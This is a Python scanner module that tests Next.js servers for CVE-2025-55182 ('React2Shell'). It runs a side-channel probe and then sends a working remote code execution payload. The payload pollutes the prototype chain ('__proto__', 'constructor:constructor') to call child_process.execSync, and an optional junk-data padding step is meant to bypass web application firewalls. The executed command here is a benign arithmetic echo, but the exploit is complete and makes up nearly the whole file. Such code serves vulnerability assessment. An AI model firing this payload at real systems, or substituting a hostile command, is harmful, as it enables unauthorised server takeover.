import httpx
import asyncio
import random
import string
import re

async def detect_protocol(scan_address, port, timeout=3):
    """
    Detects whether a service is running on HTTP or HTTPS.
    Returns the protocol string ('http' or 'https') or None if unreachable.
    """
    protocols = ['https', 'http']
    
    for protocol in protocols:
        try:
            async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
                response = await client.get(f"{protocol}://{scan_address}:{port}/")
                if response.status_code < 500:  # Any reachable response
                    return protocol
        except:
            continue
    return 'http'

def generate_junk_data(size_bytes: int) -> tuple[str, str]:
    """Generate random junk data for WAF bypass."""
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
    return param_name, junk

def build_safe_payload() -> tuple[str, str]:
    """
    Build the safe multipart form data payload for the vulnerability check (side-channel).
    """
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type

def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128) -> tuple[str, str]:
    """Build the RCE PoC multipart form data payload."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    if windows:
        # PowerShell payload - escape double quotes for JSON
        cmd = 'powershell -c \\\"41*271\\\"'
    else:
        # Linux/Unix payload - we use a calculation to verify execution
        cmd = 'echo $((41*271))'

    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    parts = []

    # Add junk data at the start if WAF bypass is enabled
    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb * 1024)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )

    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type

def is_vulnerable_safe_check(response: httpx.Response) -> bool:
    """Check if a response indicates vulnerability (safe side-channel check)."""
    if response.status_code != 500 or 'E{"digest"' not in response.text:
        return False

    server_header = response.headers.get("Server", "").lower()
    has_netlify_vary = "Netlify-Vary" in response.headers
    is_mitigated = (
        has_netlify_vary
        or server_header == "netlify"
        or server_header == "vercel"
    )
    return not is_mitigated

def is_vulnerable_rce_check(response: httpx.Response) -> bool:
    """Check if a response indicates vulnerability (RCE PoC check)."""
    # Check for the X-Action-Redirect header with the expected value
    redirect_header = response.headers.get("X-Action-Redirect", "")
    # We look for the result of 41*271 which is 11111
    return bool(re.search(r'.*/login\?a=11111.*', redirect_header))

async def check_cve_2025_55182_safe(target_url):
    """Checks for CVE-2025-55182 using the safe side-channel method."""
    body, content_type = build_safe_payload()
    return await _send_exploit(target_url, body, content_type, is_vulnerable_safe_check, "Safe Check")

async def check_cve_2025_55182_rce(target_url, windows=False):
    """Checks for CVE-2025-55182 using the RCE payload (confirms execution)."""
    body, content_type = build_rce_payload(windows=windows)
    return await _send_exploit(target_url, body, content_type, is_vulnerable_rce_check, "RCE Confirmation")

async def _send_exploit(target_url, body, content_type, check_func, scan_type):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type": content_type,
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    }
    
    body_bytes = body.encode('utf-8')
    paths = ["/", "/login", "/api"]
    
    for path in paths:
        try:
            test_url = f"{target_url.rstrip('/')}{path}"
            
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                response = await client.post(
                    test_url,
                    headers=headers,
                    content=body_bytes,
                    timeout=10
                )

                if check_func(response):
                    severity = "CRITICAL" if scan_type == "RCE Confirmation" else "HIGH"
                    return {
                        "status": "VULNERABLE",
                        "vulnerability": f"CVE-2025-55182 - React2Shell ({scan_type})",
                        "target": test_url,
                        "url": test_url,
                        "details": f"Target vulnerable to Next.js RCE. Method: {scan_type} successful.",
                        "severity": severity
                    }
                    
        except (httpx.RequestError, httpx.ConnectError, httpx.TimeoutException):
            continue
    return None

async def run_scans(target_obj, port):
    """Runs Next.js specific scans against a target object."""
    scan_address = target_obj['scan_address']
    display_target = target_obj['display_target']
    resolved_ip = target_obj['resolved_ip']
    
    all_results = []
    
    protocol = await detect_protocol(scan_address, port)
    if not protocol:
        return []

    target_url = f"{protocol}://{scan_address}:{port}"
    print(f"  -> Running Next.js scans on {target_url} (for target: {display_target})")
    
    try:
        async with httpx.AsyncClient(timeout=5, verify=False) as client:
            await client.get(target_url)
    except:
        return []
        
    # 1. Run Safe Check first
    safe_result = await check_cve_2025_55182_safe(target_url)
    
    # 2. If Safe Check hits, try RCE confirmation
    if safe_result:
        # Try Linux payload first
        rce_result = await check_cve_2025_55182_rce(target_url, windows=False)
        if rce_result:
            all_results.append(rce_result)
        else:
            # Try Windows payload if Linux fails
            rce_result_win = await check_cve_2025_55182_rce(target_url, windows=True)
            if rce_result_win:
                all_results.append(rce_result_win)
            else:
                # If neither RCE confirmation worked, add the safe result
                all_results.append(safe_result)

    # Update metadata for all results
    for res in all_results:
        res.update({
            'module': 'Next.js',
            'service_version': 'Unknown',
            'target': display_target,
            'server': scan_address,
            'port': port,
            'resolved_ip': resolved_ip
        })

    return all_results